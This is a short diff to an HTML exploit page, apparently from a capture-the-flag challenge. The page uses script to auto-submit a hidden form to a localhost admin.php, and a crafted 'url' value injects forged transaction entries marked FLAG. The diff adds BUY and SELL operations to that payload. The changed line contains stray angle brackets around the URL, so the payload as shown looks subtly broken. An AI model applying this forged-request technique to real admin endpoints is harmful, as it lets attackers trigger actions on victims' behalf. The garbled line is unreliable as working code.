@@ -7,7 +7,7 @@
       encoded as GET params so admin.php in GET mode will emit YAML.
     -->
     <form id="f" action="http://localhost:5000/admin.php" method="POST">
-      <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=FLAG">
+      <input type="hidden" name="url" value="<http://localhost:5000/admin.php?transactions>[0][amount]=1&transactions[0][country]=FLAG&transactions[0][op]=BUY&transactions[1][amount]=1&transactions[1][country]=FLAG&transactions[1][op]=SELL">
     </form>
     <script>document.getElementById('f').submit();</script>
   </body>
